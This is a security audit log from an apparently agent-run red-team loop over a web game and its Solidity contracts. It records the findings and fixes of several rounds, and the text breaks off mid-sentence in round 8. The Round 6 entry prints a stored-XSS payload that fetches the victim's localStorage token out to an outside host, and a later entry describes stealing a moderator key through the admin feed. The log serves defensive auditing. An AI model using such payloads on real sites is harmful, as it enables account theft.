# AUDIT-redteam-loop.md — autonomous overnight red-team (rounds)

A founder-directed max-effort adversarial loop over the ENTIRE project (game modules + Solidity
contracts). Each round fans out finder agents across the codebase + independent skeptics that default to
REFUTING; survivors are triaged by the main loop, code bugs fixed with a regression each (§10.4 kept
exact), balance/design calls flagged not retuned (ground rule #1), `npm test` + `node tools/sim.js` kept
green, then committed.

---

## Round 1 — whole-project sweep (42 agents, 15 raw → 8 survived)

**No CRITICAL. No §10.4 drift.** 5 code fixes (regression each) + 1 balance flag; 2 accepted/known.

### Fixed in-commit

- **`chain.js:makeChainReader` — wrong-chain reclaim guard (was HIGH-claimed, MED).** `reclaimExpiredVouchers`
  runs OUTSIDE the worker's `assertChainId` gate, and `makeChainReader` built a `usedNonce` reader from
  `CHAIN_RPC_URL`+`VOUCHER_CLAIM_ADDRESS` with no chain-id assertion. On a CHAIN_ID/RPC drift to a chain Y
  with a same-address (colliding-deploy) VoucherClaim that answers `usedNonce=false` for a nonce genuinely
  claimed on chain X, reclaim would refund the burned $OMR (`+withdraw:omr`) — a chain-boundary
  double-spend the in-game ledger can't see (it nets to zero). **Fix:** `makeChainReader` now asserts
  `getChainId()===CHAIN_ID` before returning a reader; a mismatch (or an un-answerable getChainId) returns
  **null**, routing into reclaim's existing "no reader → skip, never refund blind" fail-safe. Dormant-safe
  (no CHAIN_ID in tests → guard skipped, reader null as before). Deploy-misconfig-triggered, not
  attacker-reachable, but a real value-safety gap matching the codebase's own "never refund blind" pattern.

- **`wire.js:sweepStandingWatches` — non-transactional $OMR burn (my step-five code; MED).** The standing-
  watch worker ran on bare `pool.query` autocommits, so its `SELECT omr … FOR UPDATE` lock was inert
  (dropped at statement end). Two gaps: (A) a §10.4 omr-bucket drift if the process died between the
  `omr = omr - cost` decrement and its `intel:watch` ledger row; (B) a same-account TOCTOU where a
  concurrent `withCharacter` $OMR spend commits between the affordability read and the decrement, driving
  omr negative. **Fix:** each renewal now runs in its own `pool.connect()+BEGIN/COMMIT` (the `sweepLoans`/
  `settlePassStipend` convention) — the `FOR UPDATE` lock persists across the affordability check and the
  decrement+ledger+tap-update commit/rollback together; a cheap unlocked pre-filter avoids opening a
  connection for comfortably-live taps, with the authoritative re-check inside the txn. Existing wire tests
  confirm behavior preserved.

- **`social.js:startSearch` — missing rat exception (LOW).** `fire`/`jump`/`npcHit`/`postBounty` all void
  family omertà for a rat, but `startSearch` didn't (it never fetched the rat flag), so a same-family
  hunter was blocked at the search — making the documented fire rat-waiver unreachable for them. **Fix:**
  `startSearch` now joins `account_persistent` for `rat` and excepts it, matching the siblings. Regression
  in `test/social.js` (a same-family rat is searchable; a loyal member isn't).

- **`economy.js:swap` (buy) + `business.js:launderAtBusiness` — missing jail gate (LOW).** Laundering
  (cash→$OMR, an extraction-prep act) was safehouse-gated but not jail-gated, unlike `deal`/`cook`/
  `boostCar`. A jailed (indicted/marked) player could keep washing toward extraction from a cell. §10.4
  unaffected (bounded by the wash caps). **Fix:** both now `throw 'jailed'`. Regression in `test/economy.js`.

- **`server.js:auth` — the §10.2 agent throttle skipped authed GETs (LOW).** The global limiter gated only
  POST/DELETE (`guarded`), so an agent could poll GET /v1/me — a `withCharacter` accrual + ledger-write
  path — at unlimited rate, defeating the 1/3s agent cadence. **Fix:** the route-level `auth` preHandler
  (which already queries the account for the ban check) now also fetches `agent_flag` (LEFT JOIN, no extra
  round-trip) and enforces the agent bucket on authed GETs; **humans are left unthrottled on GETs** so
  multi-tab console loads never 429. Regression in `test/security.js`.

### Flagged (not patched — ground rule #1)

- **`territory.js:raidRivalRacket` — over-cap emission (balance).** The clock-advance is emission-neutral
  only while the owner is below the 24h income cap; a raid on a NEGLECTED (over-cap) racket hands the owner
  fresh re-accruable headroom on top of the raider's cut, so total ledgered emission can reach ~1.3× the
  per-collect ceiling. §10.4 stays exact (all moves ledgered, gang-treasuries reconciles). Recorded in
  BALANCE.md; the dial is clamping `remainMs` to real elapsed-since-collect, or accept as intended.

### Accepted / known (no action)

- **`market.js:bidListing` AB-BA** — the previously-accepted, retry-masked cross-actor char-lock inversion
  (40P01 → clean `contention`, pre-commit abort, no §10.4 drift). One skeptic refuted it outright.

**Suite 33/33 + sim drift-0 after the batch.** `forge test` remains egress-blocked (the standing
pre-mainnet contract gate); the Solidity finder surfaced no reachable mint / replay / reentrancy / access
gap this round.

## Round 2 (in progress) — attack-class + per-contract deep dives (background finders)

- **Solidity contracts (all 6) — NO REAL FINDINGS.** VoucherClaim/OMR/GearVault/OMRStaking/OmertaFees/
  OmertaBond each hold no-mint / bounded-tranche / CEI-nonce-before-transfer / reentrancy-guard / access-
  control / staking pool-vs-principal separation. Two informational notes (not bugs, not patched):
  VoucherClaim.sweep lacks OmertaBond's on-chain over-sweep guard (owner-only; the off-chain full-reserve
  queue already bounds it — the accepted "Safe = root of trust" tranche model), and GearVault.minter is
  settable-by-design (the G-MED-1 fix relies on it; the "immutable" docstring is imprecise). `forge test`
  remains the pre-mainnet gate (egress-blocked here).
- **Estate/death completeness — COMPLETE, no value/ownership/escrow leak.** Every currency crossing death is
  ledgered; every dead-funded escrow (bounty/market/loan/boxing-bet/tourney/grand-prix/stakes/futurity)
  refunds/burns/carries and reconciles its §10.4 check; account-level survivors are account-keyed;
  resolve-snapshot tables correctly excluded. **Fixed (hygiene):** `daily_progress` (character-keyed,
  value-less daily-contract counters/claimed flags) was neither wiped nor account-level → orphan rows on
  death; added to the runEstate wipe list. No §10.4 surface (holds no value; heir gets a fresh id).
- **Escrow-identity integrity (all 10 checks) — CLEAN.** Bounty/market/loan/auction/poker-tourney/futurity/
  grand-prix/stakes/boxing-bet/convoy-insurance all reconcile under every interleaving traced (estate-burn
  vs expiry-sweep, claim-vs-burn, cancel-vs-sweep double-refund, multi-winner split leak) — each closed by
  shared-lock serialization + remainder-into-take. No stray cross-module escrow writer.
- **Two-party transfer rails — CLEAN.** Every settlement rail (bodyguard/round/buyout/standover/table/
  pvpDice/poker/bout/matchRace/challenge/pinkslip/repay/collect/buyPaper/fill/shakedown/inside-job/tribute/
  toll/family-contract) carves its take, uses sorted chars→accounts→leaves→singletons locks, reads consent
  from the locked limit row, and self-guards. The only untaxed path (loan-default disbursement) is the
  ALREADY-SIGNED-OFF collusion rail (one-shot per alt, MAX_ACTIVE=1, welsher+WANTED) — no new exposure.
- **persist-clobber + pg-mem INT-quirk (exhaustive mechanical sweep) — CLEAN.** The quirk was empirically
  pinned to `intcol = intcol − $param` only (163 arithmetic-UPDATE sites; 30 parameterized subtractions,
  all NUMERIC targets; INT columns only ever get addition/literal-`−1`) → zero vulnerable sites. No
  persist-clobber: every direct-SQL write to a persisted column runs in a worker/hand-rolled txn that never
  calls persist; every non-persisted in-memory field has a backing direct-SQL mirror.
- **Worker sweep races — value-moving sweeps SOUND** (per-item transactional, idempotent under a status
  lock, no worker AB-BA, no bare-pool value move besides the R1-fixed wire one). **Fixed (observability
  parity):** six cash-escrow resolvers (`sweepGrandPrix`, `sweepFuturity`, `sweepTournaments`,
  `sweepTrackEntries`, `sweepStakes`, `sweepMainEvents`) had a silent `catch { ROLLBACK }` — a persistently-
  throwing item would retry forever with frozen escrow and NO alarm (the §10.4 check reconciles as
  open==posted, "correctly stuck"). Added `console.error` poison-row logging (the `sweepAuctions`/
  `sweepUprisings` precedent) to all six + the three no-value NPC/raid sweeps for consistency.

**Round 2 verdict: no CRITICAL/HIGH/MED §10.4, lock, auth, or contract defect. 2 small correctness/hygiene
fixes (estate `daily_progress` wipe, worker poison-row logging). Suite 33/33 + sim drift-0.**

## Round 3 — rotated lenses (input-validation, status→power, RNG/determinism, accrual, gameplay-logic, cross-system)

- **Input-validation / type-coercion — CLEAN (1 defense-in-depth).** No route accepts a client-set price/
  amount into a ledger row unchecked; `Number.isFinite` guards front the money-moving numeric bodies
  (swap, bank, bids). **Hardened:** `vanity.js:spendOmr` — the single $OMR burn primitive — gained a
  `Number.isFinite(cost) && cost>0` guard so a future caller can never invert the burn into a mint (every
  caller passes a positive constant today; defense-in-depth on the chokepoint).
- **Status-axis → gameplay-power leakage — CLEAN (1 design note).** Hitman-rep / renown / notoriety /
  smuggler-legend / war-effort / boxing-legend / recruit-count are all read-only display axes; none feed a
  roll, price, or cap. Design note (intended, not patched): the Pen shot-caller is the most-feared inmate
  by `season_kills` — a status axis that grants a small cover bonus — but it's bounded (`FACTION_COVER_CAP`),
  a mark stays killable (`SHANK_MIN` floor), and it's the documented design.
- **RNG / determinism — 2 deploy-hardening fixes.** Every money roll is server-side + `rng_audit`'d; the
  §7.11 seed is the one secret. **Fixed:** production now refuses to boot on the unset/default `MARKET_SEED`
  (the seeded draws — Numbers 600:1, Track/Fight winners, goods prices — are client-predictable on the
  public default) and refuses if any test-only roll/timer override (`SHANK_P`, `LAW_BUST_P`, `SEARCH_MS`,
  `PORT_*`, `WORLD_*`, …) leaked into the prod env (both fail-OPEN misconfigs → the fail-closed JWT-guard
  posture). Regression in test/security.js.
- **Lazy accrual — SOUND (2 balance flags, not patched per ground rule #1).** The accrual engine clamps
  offline windows (income/exposure capped at the offline gap; heat/scrutiny bleed uncapped) and the heat
  meter clamps to 100 post-accrual. Flags for founder sign-off: (a) business/territory/crew "upkeep
  forgiveness" — a front unpaid past COLD stops earning but the arrears cap at 7d, so a long-absent owner's
  worst case is bounded (intended, documented); (b) speakeasy bar-take is collect-only income with the D2
  gate now enforced on upgrade too (see cross-system fix).
- **Gameplay-logic — 1 LOW fixed, 1 design note.** **Fixed:** five on-demand heat-add sites
  (fire/npcHit/world-raid×2/launder) added to `ch.heat` unclamped while their accrual siblings clamp at
  `Math.min(100,…)` — player-unfavorable + self-correcting, clamped for parity. Design note (intended):
  `jump` has no co-location gate (unlike fire's search-then-shoot) — jumping is a lighter, location-free
  mug by design.
- **Cross-system (background finder) — 1 MED fixed.** **D2 "shield, not bunker" bypass via the upgrade
  paths:** `collectBusiness`/`collectTerritory`/`collectSpeakeasy` all gate `safeHoused`, but the sibling
  `upgradeBusiness`/`upgradeRacket`/`upgradeSpeakeasy` bank the SAME pending income (business:income/
  territory:income/speakeasy:income) with no gate — a safehoused, untargetable player could realize
  operating income (the exact act D2 forbids) through the upgrade route, systemically across three systems.
  §10.4 stays exact (normal income faucet, 24h-capped → ~0 new value) but it cracks a SIGNED anti-abuse
  rule. Added `safeHoused` (throws `safe`) + jail parity to all three upgrades; regression in
  test/economy.js. Verified SAFE by the same finder: port contraband-loot × persist (no clobber, non-
  currency), GP/Stakes/Futurity/boxing-bet escrow × loot × death (debit-before-loot, all identities
  reconcile, resolve-snapshot tables excluded from the wipe), port piracy/rendezvous/collect concurrency
  (boat row FOR UPDATE serializes; piracy take is a <100% redirect → emission only falls), racer/car
  snapshots (never escrowed → move/consume can't dup), speakeasy standover/buyout (raid-first, no double-
  collect), and every account-level legend bump (direct-SQL, absent from persistAccount → no clobber,
  survives death).

**Round 3 verdict: no CRITICAL/HIGH. 1 MED (D2 upgrade-gate, signed-rule consistency), 1 LOW (heat clamp),
2 deploy-hardening (MARKET_SEED + test-knob boot guards), 1 defense-in-depth (spendOmr guard). 3 design
notes + 2 balance flags for founder sign-off. Suite 33/33 + sim drift-0.**

## Round 4 — six fresh lenses (HTTP idempotency/rate-limit, auth/session, chain reserve, casino den-book, referral anti-Sybil, market/loot escrow) + a manual gang-dissolution trace

**Verdict: no CRITICAL/HIGH. 4 real fixes (1 auth MED, 1 casino LOW-MED §10.4-adjacent, 1 idempotency MED,
1 idempotency LOW) + 1 defense-in-depth. The escrow/loot/chain/referral cores verified sound.**

### Fixed
- **Auth F1 (MED) — banned live sockets.** `/v1/ws` checked `banned` only at CONNECT; a mid-session ban
  left an open socket feeding streets/gang/me intel until the client disconnected, falsifying the
  documented "banned-WS close" guarantee (a banned scout feeding a gang live streets data). Added a
  per-account socket registry; `mod/ban` now closes every live socket (4003). Regression opens a live
  socket, bans, asserts it closes.
- **Casino F1 (LOW-MED) — den tip before payout booked.** The econ-pass tips the street/rakeback ONLY
  from realized profit; the deferred games insert the liability before tipping, but the two same-call
  games (dice, blackjack DEAL) tipped BEFORE booking the round's payout/liability → a winning round
  over-reported profit and minted a bounded ~1%-of-stake tip into `street_tax.pool` (the buyback loop,
  §10.4-invisible — the exact class the econ-pass closed). Reordered `takeHouse` to run after the
  payout/INSERT. Casino per-round house-book mirror updated to the corrected ordering.
- **Idempotency MED — proceed-unreserved on the release race.** On an INSERT PK-conflict, if the SELECT
  then found the row GONE (the holder's 4xx/5xx DELETEd its reservation — e.g. the `contention` error we
  tell clients to retry), the handler PROCEEDED WITHOUT re-reserving → onSend stored nothing → a retry
  re-executed = double bank/spend. Now loops and re-INSERTs so every proceeding request holds a
  reservation; refuses (409) on a pathological storm rather than run unprotected.
- **Idempotency finding-2 (LOW) — post-commit render releases the key.** `view()`/`coachOf()` runs after
  COMMIT; a throw (corrupt `onboard` column) surfaced a 500 → key DELETEd → retry re-executed the
  committed action. Guarded the render in both wrappers — degrade the snapshot to null, never the 2xx.
- **Referral L1 (defense-in-depth) — recruiter board agent exclusion made explicit.** `recruiterLeaderboard`
  relied solely on the "agents never bump `recruits`" invariant (boxing/port/races boards have an explicit
  `NOT agent_flag`); added the explicit predicate so a future `recruits` writer can't surface an agent.

### Verified CLEAN (not patched)
- **Chain reserve/withdrawal (afa8):** no CRIT/HIGH — nonce allocation single-threaded under
  `chain_reserve FOR UPDATE`, `committed ≤ funded` inductive, queued-cancel double/after-sign safe, the
  R3 reclaim no-reader-skip + `usedNonce` + grace + under-lock re-check holds, fees.js nonce-PK
  idempotency + Vig txHash-gate + atomic reconcile, §10.4 `withdraw:omr` exact in all four voucher
  states. 2 LOW flagged (drainQueue has no standalone trigger — liveness; `mod/reserve/claimed` has no
  on-chain verify — mod-trust).
- **Market/auction escrow + P1.1 loot (a067):** no defects — market/auction/order escrow identities
  reconcile, the audited kind-guard holds, loot legs are §10.4-exact and clobber-safe, death paths clean.
  1 accepted item (auction $OMR bid loot-shelter — §10.4-clean loot-avoidance, self-limiting, the prior
  AUCTION-audit F3 sign-off lever).
- **Referral/growth (aa56):** no CRIT/HIGH/MED, §10.4 clean — spark/qualify/tier-2/mission latches all
  atomic once-ever, post-commit hooks wrapped, agents excluded at every tier-2 level, tier-2 is
  CASH/DEPTH-2/middle-link-qualified, push can't mint $OMR. LOW flags: tier-2 missed-fire no-retry
  (payout-loss edge), social trust-mode faucet (founder sign-off, run `live`).
- **Gang dissolution (manual):** no §10.4 orphan — treasury/omr_reserve/ammo_bank all burn `gang:dissolved`
  (no gang `cb` bucket exists), territory/frontier/districts/wars/commission-votes/portfolio all
  released/deleted, and a dissolved gang's live bounty-escrow contribution correctly BURNS (`death:bounty`
  via refundPot's deleted-gang branch) when the pot resolves — the escrow check stays balanced meanwhile.
- **Auth (a795):** verifyX default-off confused-deputy stopgap, Privy ES256+JWKS+aud(scalar|array)+exp
  hardened, guest→provider UNIQUE-guarded, agent-flag DB-sourced, SIWE replay/uniqueness closed. LOW:
  invite double-spend under concurrent first-login (budget waste, no boundary breach). INFO: Privy `iss`
  conditional (mitigated by JWKS+aud).
- **HTTP layer (adf4):** the reserve-before-execute concurrent core is sound (409 on the loser,
  char-lock serialization); replay is 2xx-only + body-bound; agent throttle DB-sourced + GET-throttled;
  swap/launder share the bucket; per-IP auth throttle trustProxy-off. LOW deploy notes: AGENT/SWAP rates
  are import-time constants (fail-secure); in-memory buckets multiply across workers without REDIS_URL;
  a crash between COMMIT and onSend leaves a status=0 row that 409s until the 24h prune (self-heals).

**Round 4 verdict: 4 fixes + 1 hardening, all committed green (suite 33/33 + sim drift-0). The chain,
escrow, loot, referral, and gang-dissolution cores are sound; residual items are LOW/deploy-config/
founder-sign-off (drainQueue liveness, mod-trust claimed, invite budget, social trust-mode, auction
loot-shelter, tier-2 missed-fire).**

## Round 5 — six deep economic lenses (kitchen, Law/RICO, territory/frontier emission, backed-$OMR flywheel, status-modifier composition, co-op crew) + a manual route-wrapper sweep

**Verdict: NO CRITICAL/HIGH/MED across all six lenses. The economy cores are sound.** Only code changes: 2
cosmetic display fixes (view cargoCap/skillPoints). Everything else is founder-sign-off / design-call.

### Fixed
- **Status-modifier cosmetics (2 display bugs).** The character view under-reported `cargoCap` (omitted the
  `road_boss` capstone's +trunk — a maxed Wheelman shown a smaller trunk than `trunkCap()` enforces) and
  `skillPoints` (omitted the prestige bonus `pointsOf()` grants). Display-only — enforcement was already
  correct — the view now mirrors the canonical helpers exactly.

### Verified CLEAN (no patch)
- **Vig / backed-$OMR flywheel (ad20) — the critical one.** No $OMR mint beyond backing exists: staking
  rewards, dividends (personal + family pools, kept separate), and the pass stipend are all pool-bounded
  TRANSFERS (in `omrBuckets`, in neither the mint nor burn term); `prize:omr` is the SOLE in-game mint,
  1:1 backed by real-revenue-bought hard $OMR moved pool→reserve. `runVigInvariants` (spend≤revenue,
  split-exact, reserve-fully-backed, extraction≤reserve) holds by construction; the fabricated-`vig_revenue`
  surface is closed by the `txHash`/`ALLOW_MOD_REAL_REVENUE` gate; PLEX burns (never mints); the AMM LP
  carve pairs event-fund $OMR (mints nothing). Extraction ≤ inflow holds.
- **Kitchen/drug economy (a17c).** Every cook/collect/deal/crew-sale ledgered + reconciles §10.4 check (a);
  the on-ramp +50% phases out exactly at trade-rank 1 (signed curve untouched); the crew-cold gate closes
  the offline-sale dodge; the Bureau raid seizes without double-count; cook/collect is race-safe; the
  victim's post-accrual stash decrement persists (no re-sale exploit). 2 by-design balance notes (hire
  defers the nut, bounded; 3-day cold-grace).
- **Law/RICO courtroom (a2ba).** Forfeiture reconciles the per-character cash check exactly (pocket-then-
  bank, floored, staked-$OMR/gear safe, NOT death); the conviction floor (0.045) forbids a minted
  acquittal; the informant collapse/meter/sweep are single-resolution + bounded (GREATEST/floor); rat/
  wanted omertà scoping is consistent across every kill site. 2 sign-off (demandTrial cheap reset,
  foundation `joined_at` fail-open on legacy NULL — deploy migration note).
- **Territory/frontier/occupation (a77f).** The emission-neutral clock-advance is provably `cut+residual ≤
  pending` (deflationary); the gang-treasuries §10.4 check categorizes every reason correctly; seizure/
  invade/liberation never double-credit; the NPC-raid rout bonus fires only on the floor-crossing. Design
  flags (§10.4-safe): a rival can muscle a COLD op the owner can't collect; rising-vassal tribute is a
  capped deferral vs the board's "pays no tribute" copy.
- **Co-op crew (heist/convoy/port) (aa2c).** Pot splits floored ≤ pot (no mint); the rat is a net sink
  (ring −EV); insurance underwriting cap makes a colluding ring's net extraction ≤0 by construction;
  degrading multi-ambush wears only on a WIN; the toll/port faucets are supply-cap/regen bounded; piracy
  is a <100% redirect (emission only falls); goods conserve by count; every direct-SQL column
  (contraband/port_used/berths) is confirmed OUT of the persist positional UPDATE (no clobber); the lock
  order is acyclic. Design flags: inside-job can rob a COLD front's pending (CONSISTENT with shakedown —
  neither PvP path gates cold, a "neglected front is vulnerable" design call, §10.4-clean); warehouse→fence
  ≤1.25× variance faucet (BALANCE.md); joiner-rat individually +EV (intended betrayal, ring −EV).
- **Manual route-wrapper sweep.** Every inline `pool.query` mutation in server.js is legit infrastructure
  (idempotency store, account/character creation, agent-flag, notifications-deliver, ban/invite) — NO
  player economic route bypasses the withCharacter/withTwoCharacters ledger+lock discipline. Character
  creation sets genesis state (server-authoritative rollStats), not a §10.4 transfer.

### Founder sign-off items surfaced (NOT bugs, ranked)
Status-modifier WATCH: (W1) skills melt (fence_network×kingpin ×1.1664) cheapens the melt→ammo faucet —
the D1 kill-EV anchor the Underworld deliberately won't touch, now indirectly moved by Skills (emission-
bounded, a `FENCE_MULT` lever); (W2) a grandmaster active clears `world_raid_at` (2h < the 4h active CD) →
~+50% solo tap-rate on non-apex outfits (emission-neutral, but a status modifier reaching a signed cash-
faucet's pacing). Plus the territory cold-muscle / inside-job-cold design call, demandTrial reset, and the
kitchen ramp-phase notes. All §10.4-clean.

**Round 5 verdict: 2 cosmetic fixes; the Vig backing wall, kitchen faucets, law forfeiture, territory
emission, co-op payouts, and the route-wrapper discipline are all sound. Suite 33/33 + sim drift-0.**

## Loop summary (Rounds 1–5)
Five rounds, ~30 finder agents + manual traces. **No CRITICAL, no HIGH exploitable-by-a-player defect, no
§10.4 conservation breach anywhere.** Fixes shipped: R1 (5 + a balance flag), R2 (2 hygiene/observability),
R3 (D2 upgrade-gate, heat clamp, RNG deploy guards, spendOmr guard), R4 (banned-WS live close, casino
tip-after-payout, idempotency re-reserve + post-commit render guard, recruiter agent exclusion), R5 (2 view
display fixes). The recurring theme: real but bounded defects — signed-rule consistency cracks, intra-call
ordering, idempotency-retry seams, and display drift — never a value-minting or conservation hole. The
backed-$OMR flywheel, escrow identities, chain reserve, loot legs, auth boundary, and lock order are the
load-bearing surfaces and all verified sound. Residuals are LOW / deploy-config / founder-sign-off, tracked
above and in BALANCE.md.

## Round 6 — four safety-critical lenses (death/PvP concurrency, competitive escrows, worker orchestration, client/public-route injection) + a manual estate-wipe completeness sweep

**Verdict: 1 HIGH (stored XSS) + 2 MED (worker monitoring) fixed. The death/PvP chain, all competitive
escrows, and the estate wipe verified sound.** This round surfaced the loop's most serious finding.

### Fixed
- **Stored XSS → account takeover (HIGH).** Player display strings (character/gang name, custom title,
  140-char contract reason, estate name) had NO server-side charset filter, the console renders them raw
  into innerHTML (no escape helper — `esc` was undefined), and the bearer token lives in localStorage. A
  name/reason like `<img onerror=fetch('//e/'+localStorage.omerta_token)>` executes when a victim views
  the contract board / streets roster → token exfiltration → cross-user account theft. Fixed at the DATA
  LAYER (shared `cleanText()` strips `< > " ` + control chars from all six write sites; legit punctuation
  survives) + client-side `esc()` defense-in-depth (also fixes a pre-existing broken `esc()` reference
  that threw). Fighter/racer/speakeasy/dynasty names already used the safe `/^[\w .,'&-]+$/` charset. The
  broadcast/public cards.js was already clean. Regression in test/security.js.
- **Worker A — real-value invariants now alarm nightly (MED→HIGH on chain go-live).** The nightly monitor
  ran only `runLedgerInvariants`; the Vig (extraction≤reserve, reserve-backed) + Bond (anti-Ponzi) walls
  were mod-route-only and self-alerted nowhere → a live unbacked reserve would drift SILENTLY. Now run
  nightly + routed through the same `alertDrift` (kind-tagged; ledger keeps its original event name).
- **Worker B — the ledger monitor is now a consistent snapshot (MED).** ~40 independent reads had no
  snapshot, so a player commit between two halves of a check tore the read into FALSE drift → a false
  webhook alarm at the non-technical founder. Now wrapped in one REPEATABLE READ / READ ONLY transaction
  (clean pg-mem fallback). No check logic changed.

### Verified CLEAN (not patched)
- **Death/PvP concurrency (a519):** no CRIT/HIGH/MED — the victim `FOR UPDATE alive` load + in-memory
  `alive=false` persist-skip (no cash resurrection), account-lock-serialized shield/loot ordering
  (bodyguard→respawn, one absorb), all-pots-pre-locked bounty-on-death, `killerCh` in-memory loot
  threading, single-`WHERE id IN` war-score (no AB-BA), and fresh-heir state all hold under adversarial
  interleaving. One benign LOW (a `bodyguardAbsorbs` guard-death TOCTOU — a just-killed guard absorbs the
  bullet in a sub-ms window; no §10.4, no resurrection, defender-favoring) — flagged.
- **Competitive escrows (a4b5):** no CRIT/HIGH — every escrow identity (boxing main-event / poker tourney
  / grand-prix / stakes / futurity) drains to 0 on every terminal state; the parimutuels never touch the
  PvE den book (reason-prefix isolation); state-before-row lock order consistent; worker resolvers
  idempotent single-writers; the two-party instant games are the audited casino:pvp taxed transfer;
  belt/callout/legend under death sound; frozen-form snapshots resolve even if the racer is bred/sold.
  Two LOW (retry-masked boxing resolve-vs-cancel AB-BA; standover forfeits the owner's pending bar take)
  — flagged.
- **Worker orchestration (a1c2):** buyback conservation exact + lock order + idempotency, season rollover
  snapshot-before-reset + under-winner-lock grant + idempotent, `safe()` per-job isolation, assertChainId
  fail-closed, reclaim no-double-spend — all sound. Two LOW flagged (no `statement_timeout`; season
  rollover is one monolithic txn — liveness, not §10.4).
- **Estate-wipe completeness (manual):** every character-keyed table is wiped (loop + direct DELETEs +
  dedicated `wipeFighterAtDeath`/`wipeSpeakeasyAtDeath`/`cancelMainEventsAtDeath`/convoys-`lost`), an
  intentional account survivor (`account_persistent`/`rng_audit`/`transactions`), or an intentional
  resolve-snapshot (`*_entries`/`futurity_runners`/`track_entries`). The two un-wiped (`notifications`,
  `missions_done`) are harmless cruft — never re-read (fresh heir id) and the reward is account-gated. No
  orphan/inheritance bug.
- **Route-wrapper discipline (manual):** no player economic route bypasses withCharacter/withTwoCharacters.

**Round 6 verdict: 3 fixes (1 HIGH XSS + 2 MED monitoring). The death/PvP + escrow + estate cores are
sound. Residual LOWs are benign/design/deploy-config. Suite green + sim drift-0.**

## Round 7 — three fresh high-value lenses (cross-system exploit chains, resource-exhaustion/DoS, admin-ops + MCP-agent surface)

**Verdict: 1 HIGH (mod-side stored XSS → root) + 3 MED (DoS) fixed. The cross-system §10.4 boundary — the
load-bearing surface — verified CLEAN end-to-end.**

### Fixed
- **Mod-side stored XSS → mod-key root escalation (HIGH).** `claimSocial` stored player free-text `proof`
  into telemetry un-sanitized; `admin.html`'s activity feed rendered it into innerHTML with no escaping,
  while the mod key lives in sessionStorage on that origin. A player's crafted proof executes when a mod
  opens `/admin` → mod-key theft → root `/v1/mod/*`. Fixed both layers (`cleanText` at source + `esc()` in
  admin.html on the feed + top-players). The same finder verified CLEAN: the mod-key perimeter
  (timingSafeEqual, no dev fallback), input validation (confiscate `[0,pocket]` clamp), comp/revenue
  txHash-gating (a comp injects zero backed value), the OpenAPI mod-exclusion, admin CSRF (custom-header
  bearer, not cookie), the MCP `omerta_request` (never forwards `x-mod-key` → agent can't reach mod), and
  signer-PK/PII non-leakage.
- **Resource-exhaustion / DoS (3× MED, read-only — no §10.4 hole).** (1) `agentLeaderboard` seq-scanned the
  append-only ledger (`reason`-only predicate) → scoped to the top-25 + `currency='omr'` (uses the index).
  (2) The keyless card/profile routes resolved names via case-insensitive `lower(name)` with only a
  case-sensitive index → seq-scan per unauthenticated hit → added a `lower(name)` functional index. (3) WS
  sockets were uncapped per account (each an O(N) streets fan-out) → capped at 8. Verified bounded: 1 MB
  body limit, PNG cache (256+TTL), 48-char name clamp, mod-gated ops scans, worker anti-amplification.
  Flagged for deploy (CDN/per-IP throttle on the keyless unfurl routes — a code throttle would break legit
  crawler volume).

### Verified CLEAN (not patched)
- **Cross-system exploit chains (ad0f) — the headline.** No CRIT/HIGH/MED. Every seam traced end-to-end:
  status↔currency laundering (invest/dividend split are exact transfers; free `grantShares` earn no
  dividend; personal & family pools separate), escrow↔escrow (each identity sums its own table on
  exact-reason matches; the one shared `bounty:refund` correctly split by `character_id IS NULL`; the
  wanted-HOUSE refund uses a distinct reason), gang-treasury round-trips (tribute/contract/territory/world/
  toll all reconcile in check (b); rival-raid clock-advance emission-neutral), death-as-laundering (exact
  cash+bank burn, loot carve-outs reduce the estate burn 1:1, debt-survives-to-heir §10.4-neutral),
  ownership-flag survival (race/pledge flags cleared on every transfer), and the backed-$OMR flywheel
  (both prize-pool consumers fundReserve; extraction≤inflow holds). No hidden mint in the entire $OMR
  vocabulary. Three re-confirmed accepted items (shared dividend-pool allocation, auction $OMR loot-shelter,
  contraband stranding) — all §10.4-clean founder dials.

**Round 7 verdict: 4 fixes (1 HIGH XSS + 3 MED DoS). The cross-system value boundary is sound. Suite green
+ sim drift-0.**

## Loop summary (Rounds 1–7, FINAL)
Seven rounds, ~40 finder agents + manual traces, every fix committed + pushed (suite green + sim drift-0
throughout). **No CRITICAL. No §10.4 conservation breach anywhere in seven rounds.** Two HIGH found, both
in the client/mod injection surface (the one surface no prior AUDIT-*.md had swept), both closed at the
data layer + client:
- **R6 HIGH:** stored XSS in the player console (name/reason/title → token theft).
- **R7 HIGH:** stored XSS in the mod dashboard (social-task proof → mod-key root escalation).
Everything economic — the backed-$OMR flywheel, all escrow identities, the cross-system §10.4 boundary,
chain reserve accounting, loot legs, death/PvP concurrency, the kitchen/law/territory/casino faucets, and
the lock order — was probed by dedicated lenses and verified sound. The 20-odd fixes shipped were: two
stored-XSS HIGHs, a set of MED consistency/monitoring/DoS hardenings (D2 upgrade-gate, banned-WS live
close, idempotency re-reserve, casino tip-after-payout, worker real-value alarms + snapshot monitor,
WS/ledger-scan DoS), RNG deploy guards, and cosmetic display fixes — never a value-minting or
conservation hole. Residual items are LOW / deploy-config / founder-sign-off, catalogued above and in
BALANCE.md. **The injection surface (both HIGHs) is the one place the codebase was genuinely exposed;
it is now closed. The economic core was already sound and stayed sound.**

## Round 8 — three fresh lenses (time/clock manipulation, unicode/encoding, Solidity contract math)

**Verdict: 1 MED (homoglyph impersonation) fixed. Time/clock + Solidity + number-parsing all sound.**

### Fixed
- **Homoglyph / zero-width / bidi impersonation on the identity name fields (MED).** Character name (=
  referral code = broadcast identity) and gang name used cleanText + length only — no charset regex —
  while the cosmetic name fields (fighter/racer/speakeasy/dynasty) already enforce `/^[\w .,'&-]+$/`. So
  `Vitо` (Cyrillic о) coexisted with `Vito` and rendered identically across every social surface (contract
  board, leaderboards, gang roster, streets feed, broadcast profile/OG card); a trailing U+200B or a U+202E
  bidi override did the same → cross-surface impersonation. Applied the same ASCII charset guard to
  character/gang create + both renames (`\w` no-`u`-flag = ASCII-only → rejects Cyrillic/zero-width/bidi).
  §10.4-untouched. Regression rewritten to the reject contract (markup + homoglyph + zero-width all 400).

### Verified CLEAN (not patched)
- **Solidity contracts (a694) — no CRIT/HIGH/MED.** Fresh source read: no-mint/fixed-supply, tranche caps
  checked before the state write under `nonReentrant`, full CEI/reentrancy on every ETH path, complete
  access control, and — the highest-risk surface — the live off-chain signers (chain.js Voucher, README
  BondQuote) match the on-chain typehashes byte-for-byte with multiply-before-divide payout math that
  floors toward the treasury. Findings are all pre-mainnet gates, NOT code bugs to patch here (Solidity
